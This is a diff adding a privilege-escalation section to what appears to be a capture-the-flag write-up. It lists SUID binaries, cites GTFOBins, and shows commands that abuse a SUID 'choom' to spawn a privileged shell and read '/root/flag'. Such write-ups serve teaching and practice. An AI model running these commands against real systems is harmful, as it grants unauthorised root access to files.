@@ -44,7 +44,35 @@ However looking through the files gives no hint on where the flag is. There are 
 
 We thought it may require further privilege escalation.
 
-## 4. Solve script
+## 4. Privilege Escalation
+
+As a typical first step, we check these commands to identify any commands allowing root access:
+- `sudo -l`
+- `find / -perm -4000 -type f`
+
+Luckily the second one gives this list:
+
+```
+/usr/bin/chfn
+/usr/bin/choom
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+```
+
+Then we check on GTFOBins at https://gtfobins.github.io/gtfobins/choom/.
+Quick tests below allow us to get the flag.
+```
+/usr/bin/choom -n 0 -- /bin/sh -p -c 'ls /root/'
+/usr/bin/choom -n 0 -- /bin/sh -p -c 'cat /root/flag'
+```
+
+## 5. Solve script
 
 Solve script is at `solve.py`.
 
